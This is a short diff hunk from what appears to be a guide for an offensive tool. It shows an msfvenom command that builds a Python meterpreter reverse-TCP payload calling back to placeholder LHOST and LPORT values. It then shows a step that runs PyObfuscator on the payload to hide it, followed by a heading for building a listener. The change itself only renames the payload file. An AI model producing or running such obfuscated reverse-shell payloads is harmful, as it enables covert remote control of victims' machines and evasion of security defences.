@@ -20,7 +20,7 @@ msfvenom -p python/meterpreter/reverse_tcp LHOST=YOURIP LPORT=YOURPORT -o payloa
 
 After that lets obfuscation it with below command :
 
-PyObfuscator payload_5050.py
+PyObfuscator payload.py
 
 # Build listener
 
